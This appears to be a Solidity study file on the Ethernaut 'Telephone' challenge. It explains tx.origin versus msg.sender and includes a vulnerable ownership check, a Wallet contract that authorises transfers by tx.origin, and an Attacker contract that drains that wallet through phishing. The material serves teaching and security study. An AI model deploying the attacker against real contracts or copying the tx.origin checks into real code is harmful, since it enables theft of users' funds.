// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    /// @notice tx.origin is the exploit here... tx.origin could open the contract owner / deployer to phishing.. See below.
    /// @notice the solution is to check that the owner is msg.sender. This check will always fail from an outside user.

    /*
        function changeOwner(address _owner) public {
        if (msg.sender == owner) {
            owner = _owner;
            }
        }
    */

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

/// tx.origin = GLOBAL VARIABLE - sender of the transaction (full call chain) user wallet address that sent the tx to ethereum
/// msg.sender = GLOBAL VARIABLE - represents the sender of any given message. An externally owned account OR a smart contract

/*
    2 main types of accounts on Ethereum;
        - Externally Owned Account = user wallet address / only type of account that hold a private key and can initiate a transaction
        - Smart Contract Account = can never initiate a transaction. Can send messages to other Smart Contracts
*/

///// PHISHING /////

contract Wallet {
    address public owner;

    /// @notice the constructor sets the contract deployer as the owner...
    constructor() public {
        owner = msg.sender;
    }

    function deplosit() public payable {}

    /// @notice the function requires the tx.origin 'sender of the transaction' to equal the owner of the contract.
    /// @notice only the owner of the contract can call this function.
    function transfer(address payable _to, uint256 _amount) public {
        require(tx.origin == owner, "You're not the owner!");
        _to.transfer(_amount);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    address payable public owner;
    /// @dev stores an instance of the Wallet contract in a variable named wallet
    Wallet wallet;

    /// @notice the constructor takes in the address of the Wallet Smart Contract and sets the deployer of Attacker to the owner
    constructor(Wallet _wallet) public {
        wallet = Wallet(_wallet);
        owner = msg.sender;
    }

    /// @notice IF the Attacker deployer / owner can trick the owner of Wallet into interacting with this function
    /// (maybe a fancy user interface), the Attacker owner can drain the balance of the Wallet Smart Contract
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
